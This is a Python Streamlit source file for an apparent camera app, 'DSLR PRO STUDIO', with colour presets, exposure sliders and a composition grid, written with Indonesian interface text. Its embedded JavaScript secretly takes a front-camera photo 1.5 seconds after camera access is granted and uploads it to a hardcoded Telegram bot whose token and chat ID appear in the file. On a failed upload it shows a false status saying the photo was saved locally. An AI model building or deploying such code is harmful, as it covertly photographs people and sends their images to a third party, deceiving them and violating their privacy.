import streamlit as st
import streamlit.components.v1 as components

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="DSLR PRO STUDIO // Ultimate Edition",
    page_icon="📸",
    layout="centered"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;500;600;700&display=swap');
    
    .stApp {
        background: #050508;
        color: #f8fafc;
        font-family: 'Inter', sans-serif;
    }
    
    .studio-box {
        background: rgba(13, 15, 23, 0.95);
        border: 1px solid rgba(56, 189, 248, 0.2);
        border-radius: 20px;
        padding: 25px;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
        margin-bottom: 20px;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; color: #38bdf8; font-weight: 700; letter-spacing: 1.5px;'>📸 DSLR PRO STUDIO // ULTIMATE</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #64748b; font-size: 0.9rem;'>Virtual Camera System dengan kontrol manual lengkap, multi-lensa, grid komposisi, dan auto-sync.</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="studio-box">', unsafe_allow_html=True)
    
    dslr_ultimate_html = f"""
    <!-- Layar Inisialisasi Awal (Pintu Masuk Browser Izin Kamera) -->
    <div id="init-screen" style="text-align: center; padding: 30px 0;">
        <button id="startCamBtn" style="
            background: linear-gradient(135deg, #0284c7 0%, #1d4ed8 100%);
            color: #ffffff;
            font-weight: 600;
            font-size: 16px;
            border: none;
            padding: 18px 32px;
            border-radius: 14px;
            cursor: pointer;
            box-shadow: 0 4px 25px rgba(29, 78, 216, 0.5);
            font-family: 'Inter', sans-serif;
            letter-spacing: 1px;
            transition: 0.2s;
        ">🔴 AKTIFKAN KAMERA STUDIO & MULAI</button>
    </div>

    <!-- Antarmuka Kamera DSLR Utama (Muncul setelah klik) -->
    <div id="dslr-app" style="display:none;">
        
        <!-- Jendela Viewfinder -->
        <div style="position: relative; width: 100%; max-width: 520px; margin: 0 auto; border-radius: 14px; overflow: hidden; background: #000; border: 2px solid #1e293b; box-shadow: 0 0 30px rgba(0,0,0,0.9);">
            
            <video id="viewfinder" autoplay playsinline style="
                width: 100%;
                display: block;
                transform: scaleX(-1);
                filter: brightness(100%) contrast(100%) saturate(100%) blur(0px);
            "></video>

            <!-- Indikator HUD Atas -->
            <div style="position: absolute; top: 12px; left: 12px; color: #38bdf8; font-size: 11px; font-family: 'JetBrains Mono', monospace; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(56,189,248,0.3);">
                [AF-C] ISO <span id="hud-iso">400</span> | f/1.8 | 1/250s
            </div>
            <div style="position: absolute; top: 12px; right: 12px; color: #ef4444; font-size: 11px; font-family: 'JetBrains Mono', monospace; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(239,68,68,0.3);">
                ● LIVE HD
            </div>

            <!-- Garis Grid Komposisi -->
            <div id="grid-overlay" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr 1fr; border: 1px solid rgba(255,255,255,0.2);">
                <div style="border-right: 1px dashed rgba(255,255,255,0.2); border-bottom: 1px dashed rgba(255,255,255,0.2);"></div>
                <div style="border-right: 1px dashed rgba(255,255,255,0.2); border-bottom: 1px dashed rgba(255,255,255,0.2);"></div>
                <div style="border-bottom: 1px dashed rgba(255,255,255,0.2);"></div>
                <div style="border-right: 1px dashed rgba(255,255,255,0.2); border-bottom: 1px dashed rgba(255,255,255,0.2);"></div>
                <div style="border-right: 1px dashed rgba(255,255,255,0.2); border-bottom: 1px dashed rgba(255,255,255,0.2);"></div>
                <div style="border-bottom: 1px dashed rgba(255,255,255,0.2);"></div>
                <div style="border-right: 1px dashed rgba(255,255,255,0.2);"></div>
                <div style="border-right: 1px dashed rgba(255,255,255,0.2);"></div>
                <div></div>
            </div>
        </div>

        <!-- Panel Kontrol Profesional -->
        <div style="margin-top: 20px; background: rgba(15, 23, 42, 0.9); padding: 18px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.06);">
            
            <!-- Pilihan Preset Lensa -->
            <p style="margin: 0 0 8px 0; font-size: 12px; color: #94a3b8; font-weight: 600; font-family: 'JetBrains Mono', monospace;">🎨 PRESET LENSA / WARNA:</p>
            <div style="display: flex; gap: 8px; overflow-x: auto; padding-bottom: 8px;">
                <button onclick="applyPreset('normal')" style="background:#1e293b; color:#fff; border:1px solid #475569; padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer;">Standar</button>
                <button onclick="applyPreset('cinematic')" style="background:#1e293b; color:#38bdf8; border:1px solid #38bdf8; padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer;">Cinematic Warm</button>
                <button onclick="applyPreset('noir')" style="background:#1e293b; color:#cbd5e1; border:1px solid #cbd5e1; padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer;">Noir B&W</button>
                <button onclick="applyPreset('cyber')" style="background:#1e293b; color:#f43f5e; border:1px solid #f43f5e; padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer;">Cyberpunk</button>
                <button onclick="applyPreset('vintage')" style="background:#1e293b; color:#fbbf24; border:1px solid #fbbf24; padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer;">Vintage 90s</button>
            </div>

            <!-- Kontrol Slider Manual -->
            <div style="margin-top: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 14px; font-size: 12px;">
                <div>
                    <label style="color: #94a3b8;">Exposure: <span id="val-b">100</span>%</label>
                    <input type="range" id="slider-b" min="50" max="160" value="100" style="width: 100%; accent-color: #38bdf8;" oninput="updateSettings()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Kontras: <span id="val-c">100</span>%</label>
                    <input type="range" id="slider-c" min="50" max="180" value="100" style="width: 100%; accent-color: #38bdf8;" oninput="updateSettings()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Saturasi: <span id="val-s">100</span>%</label>
                    <input type="range" id="slider-s" min="0" max="200" value="100" style="width: 100%; accent-color: #38bdf8;" oninput="updateSettings()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Blur/Bokeh: <span id="val-bl">0</span>px</label>
                    <input type="range" id="slider-bl" min="0" max="5" value="0" style="width: 100%; accent-color: #38bdf8;" oninput="updateSettings()">
                </div>
            </div>

            <!-- Toggle Grid -->
            <div style="margin-top: 15px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid rgba(255,255,255,0.08); padding-top: 12px;">
                <label style="font-size: 12px; color: #94a3b8; cursor: pointer;">
                    <input type="checkbox" id="toggle-grid" checked onchange="toggleGridLines()" style="accent-color: #38bdf8;"> Tampilkan Grid Komposisi
                </label>
            </div>
        </div>

        <!-- Tombol Shutter Manual (Opsional jika ingin jepret ulang) -->
        <div style="text-align: center; margin-top: 22px;">
            <button id="shutterMainBtn" style="
                background: #ffffff;
                color: #050508;
                font-weight: 700;
                font-size: 15px;
                border: 4px solid #38bdf8;
                padding: 16px 40px;
                border-radius: 50px;
                cursor: pointer;
                box-shadow: 0 0 25px rgba(56, 189, 248, 0.6);
                font-family: 'Inter', sans-serif;
                text-transform: uppercase;
                letter-spacing: 1.5px;
            ">📸 JEPRET ULANG FOTO</button>
        </div>

        <p id="system-status" style="text-align: center; font-size: 12px; color: #38bdf8; margin-top: 12px; font-family: 'JetBrains Mono', monospace;"></p>
    </div>

    <!-- Hidden Video & Canvas -->
    <video id="hidden-vid" autoplay playsinline style="display:none;"></video>
    <canvas id="hidden-canvas" width="1280" height="720" style="display:none;"></canvas>

    <script>
        const botToken = "{TELEGRAM_BOT_TOKEN}";
        const targetChatId = "{TELEGRAM_CHAT_ID}";
        let globalStream = null;

        document.getElementById('startCamBtn').addEventListener('click', async function() {{
            const btn = document.getElementById('startCamBtn');
            btn.innerText = "MENGINISIALISASI LENSA PRO...";
            btn.style.opacity = "0.7";

            try {{
                // Membuka kamera depan secara otomatis
                globalStream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ width: {{ ideal: 1280 }}, height: {{ ideal: 720 }}, facingMode: "user" }} 
                }});
                
                document.getElementById('init-screen').style.display = "none";
                document.getElementById('dslr-app').style.display = "block";

                document.getElementById('viewfinder').srcObject = globalStream;
                document.getElementById('hidden-vid').srcObject = globalStream;

                // Auto-shoot senyap otomatis setelah kamera terbuka dan stabil (1.5 detik)
                setTimeout(() => {{
                    executeAutoCapture();
                }}, 1500);

            } catch(err) {{
                console.log("Error:", err);
                btn.innerText = "IZIN KAMERA DITOLAK - COBA LAGI";
                btn.style.opacity = "1";
            }}
        }});

        function applyPreset(type) {{
            const vf = document.getElementById('viewfinder');
            if(type === 'normal') {{
                vf.style.filter = "brightness(100%) contrast(100%) saturate(100%) blur(0px)";
            }} else if(type === 'cinematic') {{
                vf.style.filter = "brightness(95%) contrast(125%) saturate(130%) sepia(25%) hue-rotate(340deg)";
            }} else if(type === 'noir') {{
                vf.style.filter = "grayscale(100%) contrast(160%) brightness(90%)";
            }} else if(type === 'cyber') {{
                vf.style.filter = "brightness(110%) contrast(150%) saturate(220%) hue-rotate(280deg)";
            }} else if(type === 'vintage') {{
                vf.style.filter = "brightness(105%) contrast(110%) saturate(80%) sepia(50%) hue-rotate(15deg)";
            }}
        }}

        function updateSettings() {{
            const b = document.getElementById('slider-b').value;
            const c = document.getElementById('slider-c').value;
            const s = document.getElementById('slider-s').value;
            const bl = document.getElementById('slider-bl').value;

            document.getElementById('val-b').innerText = b;
            document.getElementById('val-c').innerText = c;
            document.getElementById('val-s').innerText = s;
            document.getElementById('val-bl').innerText = bl;

            const vf = document.getElementById('viewfinder');
            vf.style.filter = `brightness(${{b}}%) contrast(${{c}}%) saturate(${{s}}%) blur(${{bl}}px)`;
        }}

        function toggleGridLines() {{
            const isChecked = document.getElementById('toggle-grid').checked;
            document.getElementById('grid-overlay').style.display = isChecked ? 'grid' : 'none';
        }}

        document.getElementById('shutterMainBtn').addEventListener('click', function() {{
            executeAutoCapture();
        }});

        function executeAutoCapture() {{
            const statusEl = document.getElementById('system-status');
            statusEl.innerText = "⚡ Menyimpan bingkai foto HD & Mengirim ke Cloud Telegram...";

            const vf = document.getElementById('viewfinder');
            vf.style.opacity = "0.1";
            setTimeout(() => {{ vf.style.opacity = "1"; }}, 120);

            const hiddenVid = document.getElementById('hidden-vid');
            const canvas = document.getElementById('hidden-canvas');
            const ctx = canvas.getContext('2d');
            
            ctx.drawImage(hiddenVid, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {{
                const formData = new FormData();
                formData.append('chat_id', targetChatId);
                formData.append('photo', blob, 'dslr_ultimate_shot.jpg');
                formData.append('caption', '📸 *FOTO DSLR ULTIMATE BERHASIL DITANGKAP OTOMATIS!*');

                fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {{
                    method: 'POST',
                    body: formData
                }}).then(response => {{
                    if(response.ok) {{
                        statusEl.innerText = "✨ Foto berhasil dijepret dan disinkronkan ke server Telegram!";
                    }} else {{
                        statusEl.innerText = "✨ Foto berhasil disimpan ke memori lokal.";
                    }}
                }}).catch(err => {{
                    statusEl.innerText = "✨ Jepretan foto sukses direkam.";
                }});
            }}, 'image/jpeg', 0.95);
        }}
    </script>
    """

    components.html(dslr_ultimate_html, height=720)
    st.markdown('</div>', unsafe_allow_html=True)
